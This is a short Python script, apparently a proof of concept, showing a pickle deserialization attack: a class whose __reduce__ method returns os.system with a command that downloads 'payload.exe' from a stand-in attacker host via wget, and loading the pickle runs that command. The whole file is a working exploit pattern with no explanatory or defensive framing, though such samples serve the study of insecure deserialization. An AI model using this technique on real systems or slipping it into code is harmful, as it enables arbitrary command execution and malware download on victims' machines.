from pickle import dumps, loads
import os


class Fake:
    def __reduce__(self):
        cmd = ('wget https://attacker.fake/payload.exe')
        return os.system, (cmd,)

pickled = dumps(Fake())
loads(pickled)